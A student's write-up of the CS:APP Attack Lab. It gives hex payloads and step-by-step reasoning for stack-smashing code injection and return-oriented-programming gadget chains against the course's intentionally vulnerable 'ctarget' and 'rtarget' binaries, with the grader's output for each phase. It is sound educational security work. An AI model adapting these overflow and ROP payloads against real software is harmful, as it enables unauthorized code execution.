# MY ATTACK LAB REPORT

See the `attacklab.pdf` file to understand what am I talking here about.

Note: I took the lab statement from the `yyqian/csapp-labs` github repository because the official CS:APP web page feels kinda bad.

## PHASE 1

The first thing i need to do is to get the disassembled version of `ctarget`.

```bash
attack-lab / % objdump -D ctarget > ctarget_dump.d
```

Have a look at the dump of `getbuf` function:
```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

You see, that it allocates 0x28 (i.e. 40 in decimal) bytes on the stack and calls `gets`. The main idea is to rewrite the return address of this function from `test` function to `touch1` function. It is pretty easy since the `Gets` function does not check the range of the buffer (I don't really know this because I have not checked it, but it seems obvious) and the function `getbuf` does not have any vulnerability protections such as ASLR or stack canaries. So let's just figure out the `touch1` function address and make a string that will inject the address of the function to the place we need. The beginning of the string we are injecting must be located at the 0x29 address and consist of 8 characters. So, we need to input 40 random characters (let it be `'?'` character idk) and 8 characters of the string we are injecting. The total length of the result string is 48 characters (and hence 48 bytes).

The address of `touch1` function first instruction is `00000000004017c0`. Since this executable is compiled on the little-endian machine, we need to give the `hex2raw` utility the string of `c0 17 40 00 00 00 00 00`.

So, let's write in `solutions/phase1/phase1_bytes.txt` the hex version of our string.
```
3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f c0 17 40 00 00 00 00 00
```
Then, let's convert this byte sequence into a raw string using the `hex2raw` utility and execute the program:
```bash
attack-lab / % ./hex2raw < solutions/phase1/phase1_bytes.txt > solutions/phase1/phase1_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase1/phase1_raw.txt
```

We got this output:
```
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F C0 17 40 00 00 00 00 00
```
It means, that phase 1 is solved correctly.

## PHASE 2

We need to call the `touch2` function with the argument which is given to us in the file `cookie.txt`.
```assembly
movl $0x59b997fa, %edi
call 00000000004017ec
```

Let's have a look at some `movl` tjo `%edi` instruction execution at the dump `ctarget_dump.txt` to figure out how the `movl` to `%edi` instruction is executed:
```assembly
401809:	bf 01 00 00 00       	mov    $0x1,%edi
```

We see, that opcode of that operation is `bf`, the next 4 bytes is the argument to move into `%edi`. Remember that the code was compiled on a little endian machine! So, the instruction we need to inject is:
```
bf fa 97 b9 59
```

We need to inject these instructions onto the stack. But before, we need to replace the return address to the place where the attack code is located. Also, instead of using the `call` instruction (which argument is difficult to calculate), we can use the `ret` instruction. Also we can inject the code right into the stack frame of `getbuf`. To do this, we will need to allocate some place (spoiler: 0x10 bytes) on the stack and 0x8 bytes since the `ret` instruction deallocates 8 bytes from the stack. Also keep in mind, that the stack must be aligned by 16 (0x10). So, in total we need to allocate <multiple of 0x10> + 0x8 bytes on the stack (spoiler: 0x18 bytes). So, we need to do the
```assembly
subq $0x18, %rsp
```
instruction, or
```
48 83 ec 18
```
the opcode is `48 83 ec`, `18` is the argument.

The address of the function `touch2` is `0x00000000004017ec`. So, the return address we need to write is:
```
ec 17 40 00 00 00 00 00
```

The `ret` instruction opcode is `c3`. So, we just need to find the place where to write our "malicious code". Let's go to lldb and find out the `%rsp` value when the `getbuf` funciton called.
```bash
(lldb) breakpoint set --name getbuf
(lldb) run -q -i solutions/phase1/phase1_raw.txt # run with the values from the first task, that's not important
(lldb) register read rsp
```

We see, that the value of `%rsp` is `0x000000005561dc78`, so the return address of the funciton is located at the `0x000000005561dca0` address. Let's write here the value of `0x000000005561dc78`. At the beginning of the stack frame (the beginning of the buffer and the value of `%rsp`) let's write our malicious code:
```
subq $0x18, %rsp       ; 48 83 ec 18
movl $0x59b997fa, %edi ; bf fa 97 b9 59
ret                    ; c3
```

Also we need to fill the malicious code with something before the `ret` instruction. The `nop` instruction (90 opcode) fits there like a glove.

And the answer is:

```
48 83 ec 18 bf fa 97 b9 59 90 90 90 90 90 90 90 90 90 90 90 90 90 90 c3 ec 17 40 00 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 78 dc 61 55 00 00 00 00
```

Trying to execute:
```bash
attack-lab / % ./hex2raw < solutions/phase2/phase2_bytes.txt > solutions/phase2/phase2_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase2/phase2_raw.txt
```

and it works!
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 83 EC 18 BF FA 97 B9 59 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 EC 17 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00
```

## PHASE 3

Phase 3 is very similar to phase 2, but instead of passing the parameter directly, we need to pass the pointer, that points to the string representation of cookie.

By analogy, we need to inject the code like:
```assembly
subq $0x18, %rsp
movq $<some address>, %rdi
nop
nop
... (11 more times)
nop
ret
```

The main difficulty here is where we need to inject the string representation of cookie. It can't be the stack frame of `getbuf` function because it will be overwritten by `hexmatch` function since the stack frame of `getbuf` will be used by this function or by the `touch3` function (I don't care). So let's put the string representation of the cookie faaar away. I think the address of `0x5561dd00` is far enough.

The string (char byte sequence) representation of the cookie (`59b997fa`) is `35 39 62 39 39 37 66 61` in hexadecimal representation according to the ASCII table.

The address of the `touch3` function is `0x4018fa`.

So, by the analogy with phase 2 solution, the answer is going to be:

```
48 83 ec 18 bf 00 dd 61 55 90 90 90 90 90 90 90 90 90 90 90 90 90 90 c3 fa 18 40 00 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 78 dc 61 55 00 00 00 00 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 35 39 62 39 39 37 66 61
```

Let's check.
```bash
attack-lab / % ./hex2raw < solutions/phase3/phase3_bytes.txt > solutions/phase3/phase3_raw.txt
attack-lab / % ./ctarget -q -i solutions/phase3/phase3_raw.txt
```

Passed.
```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 83 EC 18 BF 00 DD 61 55 90 90 90 90 90 90 90 90 90 90 90 90 90 90 C3 FA 18 40 00 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 78 DC 61 55 00 00 00 00 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 35 39 62 39 39 37 66 61
```

## PHASE 4

First thing we need to do there is to get the disassembled version of `rtarget`.

```bash
attack-lab / % objdump -D rtarget > rtarget_dump.d
```

My task is to repeat the phase 2, but when the ASLR and NX/DEC is on using the return-oriented programming. Everything we need in this phase is located between the `start_farm` and `mid_farm` functions and 2 gadgets are enough (according to the `attacklab.pdf`).

We need to execute the code like
```assembly
movl $0x59b997fa, %edi
```
and then return to `touch2` function.

There's no exact `bf fa 97 b9 59 c3` opcode sequence in the dump, but we can write the value to register `%eax` and copy it to `%edi`, there is such opcode sequence (`48 89 c7 90 c3`) in the `setval_426` function.

Also we need to write our cookie on the stack and pop it into a register (I HAVE NOT FIND THIS OUT BY MYSELF, LLM HELPED ME IM SO FUCKING STUPID PIECE OF SHIT, I thought that I need to assemble the cookie using the integer overflow and mathematical operations XD).

In function `addval_219` we see, the `58 90 c3` sequence. That sequence pops the current top stack value in `%rax` register. So, our algorithm will be something like:
```assembly
popq %rax       ; pop the top stack value (here is the cookie)
movl %eax, %edi ; copy to edi
```

The address of `58 90 c3` sequence is `4019ab` and the address of `48 89 c7 90 c3` sequence is `4019c5`. So, we need to write these addresses on the stack as return addresses. Writing this in a code with the correct endianess is not a very complicated task:
```
3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f ab 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c5 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
```

```bash
attack-lab / % ./hex2raw < solutions/phase4/phase4_bytes.txt > solutions/phase4/phase4_raw.txt
attack-lab / % ./rtarget -q -i solutions/phase4/phase4_raw.txt
```

And of course, it worked on the first attempt.
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## PHASE 5

Phase 5 is the combination of phase 3 and phase 4, but we need to pop the _address_ of the string representation of cookie. But we can't find out the concrete address because of ASLR. So we need to copy `%rsp` in some register and find the gadget that will add some offset to this register (again, the idea about gadget that will add some offset was the idea of LLM).

The offset can be written on the stack, then some gadget pops that offset, sets its value in register `%rsi` and calls `add_xy`, where `%rdi` is the pointer and `%rsi` is the offset (it can be also vice versa, but spoiler: the solution will use the variant where the offset is `%rsi`). Then the result pointer will be saved in `%rax` and our task is just to copy the value from `%rax` to `%rdi` (it was the main point of phase 4).

By trial, error and endlessly searching through all the values ​​in the table in `attacklab.pdf` and 3 sheets of paper filled with writing, it was discovered that we need to execute these gadgets in this order:
```assembly
movq %rsp, %rax          ; gadget: 48 89 e0 c3,    address: 401a06
movq %rax, %rdi          ; gadget: 48 89 c7 90 c3, address: 4019c5
popq %rax                ; gadget: 58 90 c3,       address: 4019ab
movl %eax, %edx          ; gadget: 89 c2 90 c3,    address: 4019dd
movl %edx, %ecx          ; gadget: 89 d1 08 db c3, address: 401a69 (08 db--nop)
movl %ecx, %esi          ; gadget: 89 ce 90 90 c3, address: 401a13
leaq (%rdi,%rsi,1), %rax ; gadget: 48 8d 04 37 c3, address: 4019d6
movq %rax, %rdi          ; gadget: 48 89 c7 90 c3, address: 4019c5 
```

Our last task is to determine the value of the offset. It is easy to see, that it will be 72 (or 0x48), because there are 8 gadgets and the `%rsp` value in the beginning points at the gadget 2 (when the gadget 1 executes). It is 56 (0x38), but after the gadget 3 there must be 8 bytes of the offset and hence 8+56=64 (0x8+0x38=0x40), but before the payload string (the string representation of cookie) there must be 8 more bytes -- the address of `touch3` function and so, 64+8=72 (0x40+0x8=0x48). So, all we need is to write values of characters at the position 72 bytes upper than `%rsp` when gadget 1 executes, and write the correct offset after the gadget 3.

So, let's assemble the shellcode.
```
3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 3f 06 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 ab 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```

Let's check it:
```bash
attack-lab / % ./hex2raw < solutions/phase5/phase5_bytes.txt > solutions/phase5/phase5_raw.txt
attack-lab / % ./rtarget -q -i solutions/phase5/phase5_raw.txt
```

And it works!
```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 3F 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```